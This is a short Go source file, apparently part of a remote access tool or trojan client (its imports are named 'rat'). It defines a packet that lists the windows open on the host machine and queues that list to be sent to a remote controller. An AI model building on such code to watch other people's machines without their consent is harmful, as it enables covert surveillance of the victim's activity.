package main

import (
	"rat/client/windows"
	"rat/common"
)

type WindowsPacket struct {
	Windows []common.Window `network:"send"`
}

func (packet WindowsPacket) Header() common.PacketHeader {
	return common.WindowsHeader
}

func (packet *WindowsPacket) Init() {
	windows.QueryWindows()

	packet.Windows = windows.Windows
}

func (packet WindowsPacket) OnReceive() error {
	Queue <- &WindowsPacket{}

	return nil
}
